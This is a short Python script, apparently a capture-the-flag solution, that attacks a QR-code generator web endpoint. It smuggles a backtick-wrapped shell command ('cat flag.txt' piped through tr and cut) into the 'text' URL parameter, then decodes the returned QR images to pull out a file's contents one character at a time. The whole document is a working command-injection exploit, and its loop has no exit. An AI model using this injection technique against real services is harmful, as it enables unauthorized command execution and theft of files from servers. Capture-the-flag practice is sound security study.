from pyzbar.pyzbar import decode
from PIL import Image
import requests as r

cmd = "cat flag.txt"
flag = ""
char = 1

while True:
    url = f"http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text=`{cmd} | tr '\n' '|' | cut -c{char}-`"
    req = r.get(url)

    with open('./tmp_qr.png', 'wb') as f:
        f.write(req.content)

    data = decode(Image.open('./tmp_qr.png'))[0].data.decode('utf-8')

    flag += data
    print(f"DATA: {flag} @ char {char}")
    char += 1

print(f"OUTPUT: {flag}")
